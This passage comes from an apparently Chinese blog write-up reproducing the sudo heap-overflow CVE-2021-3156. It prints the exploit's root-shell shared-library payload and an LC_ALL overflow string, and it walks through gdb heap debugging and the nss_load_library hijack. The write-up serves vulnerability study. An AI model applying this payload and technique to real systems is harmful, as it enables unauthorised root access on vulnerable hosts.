envp[]：</p><ul><li>char *sh：代表着要运行的程序，这里就是/usr/bin/目录下的sudoedit。</li><li>char* argv[]：sudoedit运行前向其传入的命令及参数：sudo -s …….</li><li>char* envp[]：代表着传入的环境变量</li></ul></blockquote><h2 id="2-分析-so"><a href="#2-分析-so" class="headerlink" title="2. 分析.so"></a>2. 分析.so</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __attribute__ ((constructor)) _init(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> _init(<span class="keyword">void</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] bl1ng bl1ng! We got it!\n"</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> BRUTE</span></span><br><span class="line">setuid(<span class="number">0</span>); seteuid(<span class="number">0</span>); setgid(<span class="number">0</span>); setegid(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *a_argv[] = &#123; <span class="string">"sh"</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *a_envp[] = &#123; <span class="string">"PATH=/bin:/usr/bin:/sbin"</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">execv(<span class="string">"/bin/sh"</span>, a_argv);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>1.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">static</span> <span class="keyword">void</span> __attribute__ ((constructor)) _init(<span class="keyword">void</span>);</span><br></pre></td></tr></table></figure><p>看不懂什么东西?</p><p>GNU C 的一大特色就是<code>__attribute__</code> 机制。<code>__attribute__</code> 可以设置函数属性（Function Attribute ）、变量属性（Variable Attribute ）和类型属性（Type Attribute ）。</p><p><code>__attribute__</code> 书写特征是：<code>__attribute__</code> 前后都有两个下划线，并切后面会紧跟一对原括弧，括弧里面是相应的<code>__attribute__</code> 参数。</p><p><code>constructor</code>参数让系统执行<code>main()</code>函数之前调用函数(被<code>__attribute__((constructor))</code>修饰的函数).同理, <code>destructor</code>让系统在<code>main()</code>函数退出或者调用了<code>exit()</code>之后,调用我们的函数.带有这些修饰属性的函数,对于我们初始化一些在程序中使用的数据非常有用.</p><p>也就是说在执行main函数之前先执行__init函数</p><p>2.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line">&gt;<span class="function"><span class="keyword">int</span> <span class="title">seteuid</span><span class="params">(<span class="keyword">uid_t</span> uid)</span></span>;</span><br><span class="line">&gt;<span class="function"><span class="keyword">int</span> <span class="title">setegid</span><span class="params">(gid_ gid)</span></span>;</span><br></pre></td></tr></table></figure><p>只设置euid</p></blockquote><h2 id="3-如何加载so"><a href="#3-如何加载so" class="headerlink" title="3. 如何加载so"></a>3. 如何加载so</h2><h3 id="nss"><a href="#nss" class="headerlink" title="nss"></a>nss</h3><p>nss_load_library是glibc中nss的一个函数，而NSS（Name Service Switch）相关配置文件存储在/etc/nsswitch.conf，这个文件是用来解析用户ID登录名称、IP地址转换为主机名等</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/nsswitch.conf</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Example configuration of GNU Name Service Switch functionality.</span></span><br><span class="line"><span class="comment"># If you have the `glibc-doc-reference' and `info' packages installed, try:</span></span><br><span class="line"><span class="comment"># `info libc "Name Service Switch"' for information about this file.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#搜索项          #搜索方式           路径名             搜索项存放的内容</span></span><br><span class="line">passwd:         compat systemd <span class="comment">#在/etc/passwd中搜索     用户口令</span></span><br><span class="line">group:          compat systemd <span class="comment">#在/etc/group中搜索      用户所在组</span></span><br><span class="line">shadow:         compat         <span class="comment">#在/etc/shadow中搜索     映射口令信息</span></span><br><span class="line">gshadow:        files          <span class="comment">#在/etc/gshadow中搜索    组用户的密码信息</span></span><br><span class="line"><span class="comment">##（systemd：自启动服务）</span></span><br><span class="line">hosts:          files mdns4_minimal [NOTFOUND=<span class="built_in">return</span>] dns myhostname</span><br><span class="line">                               <span class="comment">#在/etc/hosts中搜索      主机名和主机号</span></span><br><span class="line">networks:       files          <span class="comment">#在/etc/networks中搜索   网络名及网络号</span></span><br><span class="line"></span><br><span class="line">protocols:      db files       <span class="comment">#在/etc/protocols中搜索  网络协议</span></span><br><span class="line">services:       db files       <span class="comment">#在/etc/services中搜索   网络服务</span></span><br><span class="line">ethers:         db files       <span class="comment">#文件数目不确定，略        MAC地址   </span></span><br><span class="line">rpc:            db files       <span class="comment">#在/etc/rpc中搜索        远程过程调用名及调用号     </span></span><br><span class="line"></span><br><span class="line">netgroup:       nis            <span class="comment">#在/etc/netgroup中搜索   定义网络范围组</span></span><br><span class="line">                                                      （用于在执行远程安装，远程登录和远程Shell时检查权限）</span><br></pre></td></tr></table></figure><p>所以poc中必定加载了nss_load_library函数</p><p>说每个程序加载时都会解析nsswitch.conf文件。</p><h3 id="locale"><a href="#locale" class="headerlink" title="locale"></a>locale</h3><p>在Linux中通过locale（区域设置）来设置程序运行的不同语言环境，locale由ANSI C提供支持。同时，在locale环境中，通过一组变量来代表国际化环境中的不同设置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LC_ALL=C.UTF<span class="number">-8</span>@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure><p>解释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">LC_COLLATE    定义该环境的排序和比较规则</span><br><span class="line">LC_CTYPE      用于字符分类和字符串处理，控制所有字符的处理方式，包括字符编码，</span><br><span class="line">              字符是单字节还是多字节，如何打印等。是最重要的一个环境变量。</span><br><span class="line">LC_MONETARY   货币格式</span><br><span class="line">LC_NUMERIC    非货币的数字显示格式</span><br><span class="line">LC_TIME       时间和日期格式</span><br><span class="line">LC_MESSAGES   提示信息的语言。另外还有一个LANGUAGE参数，它与LC_MESSAGES相似，</span><br><span class="line">              但如果该参数一旦设置，则LC_MESSAGES参数就会失效。</span><br><span class="line">              LANGUAGE参数可同时设置多种语言信息，</span><br><span class="line">              如LANGUANE&#x3D;“zh_CN.GB18030:zh_CN.GB2312:zh_CN”。</span><br><span class="line">LANG          LC_*的默认值，是最低级别的设置，如果LC_*没有设置，则使用该值。类似于 LC_ALL。</span><br><span class="line">LC_ALL        它是一个宏，如果该值设置了，则该值会覆盖所有LC_*的设置值。注意，LANG的值不受该宏影响。</span><br><span class="line"></span><br><span class="line">&quot;C&quot;是系统默认的locale，&quot;POSIX&quot;是&quot;C&quot;的别名。所以当我们新安装完一个系统时，</span><br><span class="line">默认的locale就是C或POSIX。“POSIX”:指定的最小环境c语言翻译称为POSIX locale。</span><br><span class="line">如果不调用setlocale (), POSIX locale是默认的“C”相当于“POSIX”。</span><br></pre></td></tr></table></figure><h2 id="4-调试poc"><a href="#4-调试poc" class="headerlink" title="4. 调试poc"></a>4. 调试poc</h2><p>重点关注这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">nss_load_library (service_user *ni)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This service has not yet been used.  Fetch the service</span></span><br><span class="line"><span class="comment">         library for it, creating a new one if need be.  If there</span></span><br><span class="line"><span class="comment">         is no service table from the file, this static variable</span></span><br><span class="line"><span class="comment">         holds the head of the service_library list made from the</span></span><br><span class="line"><span class="comment">         default configuration.  */</span></span><br><span class="line">      <span class="keyword">static</span> name_database default_table;</span><br><span class="line">      ni-&gt;library = nss_new_service (service_table ?: &amp;default_table,</span><br><span class="line">                                     ni-&gt;name);</span><br><span class="line">      <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ni-&gt;library-&gt;lib_handle == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Load the shared library.  */</span></span><br><span class="line">      <span class="keyword">size_t</span> shlen = (<span class="number">7</span> + <span class="built_in">strlen</span> (ni-&gt;name) + <span class="number">3</span></span><br><span class="line">                      + <span class="built_in">strlen</span> (__nss_shlib_revision) + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">int</span> saved_errno = errno;</span><br><span class="line">      <span class="keyword">char</span> shlib_name[shlen];</span><br><span class="line">      <span class="comment">/* Construct shared object name.  */</span></span><br><span class="line">      __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,</span><br><span class="line">                                              <span class="string">"libnss_"</span>),</span><br><span class="line">                                    ni-&gt;name),</span><br><span class="line">                          <span class="string">".so"</span>),</span><br><span class="line">                __nss_shlib_revision);</span><br><span class="line">      ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name);</span><br><span class="line">      <span class="keyword">if</span> (ni-&gt;library-&gt;lib_handle == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Failed to load the library.  */</span></span><br><span class="line">          ni-&gt;library-&gt;lib_handle = (<span class="keyword">void</span> *) <span class="number">-1l</span>;</span><br><span class="line">          __set_errno (saved_errno);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> USE_NSCD</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (is_nscd)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Call the init function when nscd is used.  */</span></span><br><span class="line">          <span class="keyword">size_t</span> initlen = (<span class="number">5</span> + <span class="built_in">strlen</span> (ni-&gt;name)</span><br><span class="line">                            + <span class="built_in">strlen</span> (<span class="string">"_init"</span>) + <span class="number">1</span>);</span><br><span class="line">          <span class="keyword">char</span> init_name[initlen];</span><br><span class="line">          <span class="comment">/* Construct the init function name.  */</span></span><br><span class="line">          __stpcpy (__stpcpy (__stpcpy (init_name,</span><br><span class="line">                                        <span class="string">"_nss_"</span>),</span><br><span class="line">                              ni-&gt;name),</span><br><span class="line">                    <span class="string">"_init"</span>);</span><br><span class="line">          <span class="comment">/* Find the optional init function.  */</span></span><br><span class="line">          <span class="keyword">void</span> (*ifct) (<span class="keyword">void</span> (*) (<span class="keyword">size_t</span>, struct traced_file *))</span><br><span class="line">            = __libc_dlsym (ni-&gt;library-&gt;lib_handle, init_name);</span><br><span class="line">          <span class="keyword">if</span> (ifct != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">void</span> (*cb) (<span class="keyword">size_t</span>, struct traced_file *) = nscd_init_cb;</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">              PTR_DEMANGLE (cb);</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">endif</span></span></span><br><span class="line">              ifct (cb);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><blockquote><p>参数结构体在nsswitch.h中定义</p><p><img src="/2021/04/13/CVE-2021-3156%E5%A4%8D%E7%8E%B0/image-20210415152757666-1618586880599.png" alt="image-20210415152757666"></p><p><img src="/2021/04/13/CVE-2021-3156%E5%A4%8D%E7%8E%B0/image-20210415152738770-1618586880599.png" alt="image-20210415152738770"></p><p><strong>通过阅读nss_load_library函数实现可知：当 ni-&gt;library-&gt;lib_handle == NULL时，会通过__libc_dlopen调用 “libnss_”+ni-&gt;name+”.so”;因此我们要通过溢出覆写service_user-&gt;name，使得程序加载攻击者预先设置的恶意libc从而提权:</strong></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb poc</span><br><span class="line">b execve</span><br><span class="line">r</span><br><span class="line">b nss_load_library</span><br><span class="line">c</span><br><span class="line">dir &#x2F;home&#x2F;cyberangel&#x2F;Desktop&#x2F;sudo-1.8.21p2&#x2F;plugins&#x2F;sudoers</span><br><span class="line">b sudoers.c:842</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p>调试的堆</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">32</span>gx to<span class="number">-0x10</span></span><br><span class="line"><span class="number">0x55f5ae7e1310</span>:<span class="number">0x0000000000000030</span><span class="number">0x0000000000000081</span> <span class="comment">//==&gt;malloc chunk</span></span><br><span class="line"><span class="number">0x55f5ae7e1320</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55f5ae7e1330</span>:<span class="number">0x73000a33352e302e</span><span class="number">0x666e6f632e766c6f</span></span><br><span class="line"><span class="number">0x55f5ae7e1340</span>:<span class="number">0x6f66202938000a2e</span><span class="number">0x6c69617465642072</span></span><br><span class="line"><span class="number">0x55f5ae7e1350</span>:<span class="number">0x2074756f62612073</span><span class="number">0x7070757320656874</span></span><br><span class="line"><span class="number">0x55f5ae7e1360</span>:<span class="number">0x6f6d20646574726f</span><span class="number">0x000a666f20736564</span></span><br><span class="line"><span class="number">0x55f5ae7e1370</span>:<span class="number">0x0000008000080000</span><span class="number">0xffffffff00060014</span></span><br><span class="line"><span class="number">0x55f5ae7e1380</span>:<span class="number">0x00000249ffffffff</span><span class="number">0x0000000000000249</span></span><br><span class="line"><span class="number">0x55f5ae7e1390</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000041</span> <span class="comment">//==&gt;control chunk</span></span><br><span class="line"><span class="number">0x55f5ae7e13a0</span>:<span class="number">0x000055f5ae7e13e0</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55f5ae7e13b0</span>:<span class="number">0x0000000100000000</span><span class="number">0x000055f500000001</span></span><br><span class="line"><span class="number">0x55f5ae7e13c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55f5ae7e13d0</span>:<span class="number">0x00007461706d6f63</span><span class="number">0x0000000000000041</span></span><br><span class="line"><span class="number">0x55f5ae7e13e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55f5ae7e13f0</span>:<span class="number">0x0000000100000000</span><span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x55f5ae7e1400</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p><img src="/2021/04/13/CVE-2021-3156%E5%A4%8D%E7%8E%B0/image-20210416163150184-1618586880599.png" alt="image-20210416163150184"></p><p>覆盖完成之后ni-&gt;library==NULL，因此需要利用漏洞写入多个\x00来达到目的。</p><p>溢出后可见成功用X/P0P_SH3LLZ_ 覆写了file服务规范的name字段</p><p><img src="/2021/04/13/CVE-2021-3156%E5%A4%8D%E7%8E%B0/image-20210416163647748-1618586880600.png" alt="image-20210416163647748"></p><h1 id="0x08-如何利用"><a href="#0x08-如何利用" class="headerlink" title="0x08 如何利用"></a>0x08 如何利用</h1><h2 id="1-setlocale"><a href="#1-setlocale" class="headerlink" title="1. setlocale"></a>1. setlocale</h2><p>漏洞利用会使用 <code>setlocale</code>函数来进行堆布局。<code>_nl_global_locale</code> 是一个全局变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> _<span class="title">nl_global_locale</span> <span class="title">attribute_hidden</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Note: LC_ALL is not a valid index into this array.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">locale_data</span> *__<span class="title">locales</span>[13];</span> <span class="comment">/* 13 = __LC_LAST. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* To increase the speed of this solution we add some special members.  */</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">unsigned</span> short <span class="keyword">int</span> *__ctype_b;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">int</span> *__ctype_tolower;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">int</span> *__ctype_toupper;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Note: LC_ALL is not a valid index into this array.  */</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *__names[<span class="number">13</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>主要关注其 <code>_names</code>成员，<code>_name</code>是一个数组，长度为13，下标值在代码中称为 <code>category</code>，不同 <code>category</code>值表示含义如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.31\locale\locale.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LC_CTYPE          __LC_CTYPE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LC_NUMERIC        __LC_NUMERIC</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LC_TIME           __LC_TIME</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LC_COLLATE        __LC_COLLATE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LC_MONETARY       __LC_MONETARY</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LC_MESSAGES       __LC_MESSAGES</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  LC_ALL        __LC_ALL</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LC_PAPER    __LC_PAPER</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LC_NAME        __LC_NAME</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LC_ADDRESS     __LC_ADDRESS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LC_TELEPHONE   __LC_TELEPHONE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LC_MEASUREMENT    __LC_MEASUREMENT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LC_IDENTIFICATION __LC_IDENTIFICATION</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//glibc-2.31\locale\bits\locale.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __LC_CTYPE       0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __LC_NUMERIC     1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __LC_TIME     2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __LC_COLLATE     3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __LC_MONETARY       4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __LC_MESSAGES       5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __LC_ALL      6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __LC_PAPER       7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __LC_NAME     8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __LC_ADDRESS     9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __LC_TELEPHONE     10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __LC_MEASUREMENT   11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __LC_IDENTIFICATION   12</span></span><br></pre></td></tr></table></figure><p>除了 <code>LC_ALL</code>，如果其余值一样，比如都是 <code>C.UTF-8</code>，那么 <code>LC_ALL</code>的值也是 <code>C.UTF-8</code>。</p><p>如果不是完全一样，那么 <code>LC_ALL</code>的值就是 <code>LC_CTYPE= ...;LC_NUMERIC=...;LC_IDENTIFICATION=....</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.31\locale\findlocale.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">locale_data</span> *</span></span><br><span class="line"><span class="class">_<span class="title">nl_find_locale</span> (<span class="title">const</span> <span class="title">char</span> *<span class="title">locale_path</span>, <span class="title">size_t</span> <span class="title">locale_path_len</span>,</span></span><br><span class="line"><span class="class">     <span class="title">int</span> <span class="title">category</span>, <span class="title">const</span> <span class="title">char</span> **<span class="title">name</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">int</span> mask;</span><br><span class="line">  <span class="comment">/* Name of the locale for this category.  */</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *cloc_name = *name;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *language;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *modifier;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *territory;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *codeset;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *normalized_codeset;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">loaded_l10nfile</span> *<span class="title">locale_file</span>;</span></span><br><span class="line">  <span class="keyword">if</span> (cloc_name[<span class="number">0</span>] == <span class="string">'\0'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* The user decides which locale to use by setting environment</span></span><br><span class="line"><span class="comment">   variables.  */</span></span><br><span class="line">      cloc_name = getenv (<span class="string">"LC_ALL"</span>);</span><br><span class="line">      <span class="keyword">if</span> (!name_present (cloc_name))</span><br><span class="line">  cloc_name = getenv (_nl_category_names_get (category));</span><br><span class="line">      <span class="keyword">if</span> (!name_present (cloc_name))</span><br><span class="line">  cloc_name = getenv (<span class="string">"LANG"</span>);</span><br><span class="line">      <span class="keyword">if</span> (!name_present (cloc_name))</span><br><span class="line">  cloc_name = _nl_C_name;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol><li><code>cloc_name</code>的值来源是先读取环境变量 <code>LC_ALL</code>，若没有再根据 <code>category</code>的值去读取对应的环境变量，<code>exp</code>代码都是通过环境变量来控制 <code>clonc_name</code>的，因此 <code>cloc_name</code>的值最初就是来源于设置的环境变量，且 <code>cloc_name</code>的值最终会拷贝到堆块，并将字符串指针存入 <code>_nl_global_locale._names</code></li><li>函数 <code>_nl_find_locale</code>设置的是除 <code>LC_ALL</code>以外的其他 <code>category</code>的值，<code>LC_ALL</code>的值是由 <code>new_composite_name</code>函数确定，逻辑已在上述中说明</li><li>设置 LC_ 的值是从尾部开始的，也就是 <code>category</code>的值是从 <code>12~0</code>来遍历的（跳过6，即 LC_ALL)</li></ol><p><code>setlocale(LC_ALL, &quot;&quot;)</code>函数主要就是会根据环境变量申请对应字符大小的堆块，并设置 <code>_nl_global_locale.__names</code>的值为该堆块指针。这里相当于存在一个 <code>malloc</code>操作。</p><p><code>setlocale</code>执行顺序：</p><ol><li><code>setlocale(LC_ALL, &quot;&quot;)</code>，从环境变量中设置 